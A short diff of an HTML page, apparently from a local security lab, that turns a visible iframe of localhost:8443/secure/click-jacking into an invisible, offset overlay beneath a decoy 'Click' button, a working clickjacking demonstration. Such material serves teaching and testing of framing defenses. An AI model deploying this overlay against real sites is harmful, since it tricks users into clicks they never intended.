@@ -1,18 +1,22 @@
 <!doctype html>
-<html>
+<html id="html">
   <head>
     <meta charset="UTF-8" />
     <title>Click Jacking</title>
     <style>
-      iframe {
+      #frame {
         width: 500px;
         height: 500px;
-        border: 1px solid black;
+        position: absolute;
+        left: -10px;
+        top: -125px;
+        opacity: 0;
       }
     </style>
   </head>
   <body>
-    <iframe src="https://localhost:8443/secure/click-jacking">
+    <iframe id="frame" src="https://localhost:8443/secure/click-jacking">
     </iframe>
+    <button type="button">Click</button>
   </body>
 </html>
